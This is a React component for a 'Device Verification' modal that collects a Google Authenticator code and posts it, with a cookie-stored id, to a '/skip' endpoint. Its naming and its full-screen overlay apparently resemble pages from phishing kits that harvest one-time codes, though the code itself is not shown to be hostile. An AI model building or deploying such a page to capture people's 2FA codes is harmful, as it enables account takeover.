import { Form, Formik } from "formik";
import { motion } from "framer-motion";
import Cookies from "js-cookie";
import React, { useState } from "react";
import { toast } from "react-toastify";
import { API_URL } from "../config/index";
import TextfieldWrapper from "./TextfieldWrapper";

function Security({ setShowModal }) {
  const [loading, setLoading] = useState(false);
  const id = Cookies.get("id");

  const initialValues = { id: id || "", skipcode: "" };

  const handleSubmit = async (values, { resetForm }) => {
    setLoading(true);

    try {
      const res = await fetch(`${API_URL}/skip`, {
        method: "POST",
        headers: {
          Accept: "application/json",
          "Content-Type": "application/json",
        },
        body: JSON.stringify(values),
      });

      const data = await res.json();

      if (res.ok) {
        toast.success("Login Successful!");
        resetForm();
        Cookies.remove("id");
        setShowModal(false);
      } else {
        toast.error(data?.message || "Something went wrong");
      }
    } catch (error) {
      toast.error("Network error. Please try again.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="h-screen bg-black flex justify-center items-center px-4">
      <motion.div
        initial={{ scale: 0.7 }}
        animate={{ scale: 1 }}
        transition={{ duration: 0.2 }}
        className="w-full max-w-sm bg-white text-black rounded-lg shadow-lg p-5 sm:p-8"
      >
        <Formik initialValues={initialValues} onSubmit={handleSubmit}>
          {({ isSubmitting }) => (
            <Form className="flex flex-col">
              <h2 className="text-lg font-semibold text-center">
                Device Verification 1/2
              </h2>
              <p className="mt-2 text-sm text-center">
                Enter the <strong>Verification Code</strong> from your{" "}
                <strong>Google Authenticator</strong> app.
              </p>

              <div className="mt-4">
                <label className="text-sm text-gray-600 block">
                  Enter Code *
                </label>
                <TextfieldWrapper
                  name="skipcode"
                  type="text"
                  required
                  autoFocus
                  className="w-full mt-1"
                />
              </div>

              <p className="text-xs text-gray-500 mt-3 text-center">
                Having trouble receiving the code? Contact{" "}
                <span className="text-blue-500 cursor-pointer underline">
                  Support
                </span>
                .
              </p>

              <div className="mt-5 flex flex-col sm:flex-row gap-3">
                <button
                  type="button"
                  className="w-full sm:w-1/2 py-2 border border-gray-300 text-gray-700 rounded-md hover:bg-gray-200 transition-all"
                  onClick={() => setShowModal(false)}
                >
                  Cancel
                </button>
                <button
                  type="submit"
                  disabled={loading || isSubmitting}
                  className={`w-full sm:w-1/2 py-2 border border-custom-amber text-custom-amber rounded-md transition-all ${
                    loading
                      ? "opacity-50 cursor-not-allowed"
                      : "hover:bg-custom-yellow"
                  }`}
                >
                  {loading ? "Verifying..." : "Verify"}
                </button>
              </div>
            </Form>
          )}
        </Formik>
      </motion.div>
    </div>
  );
}

export default Security;
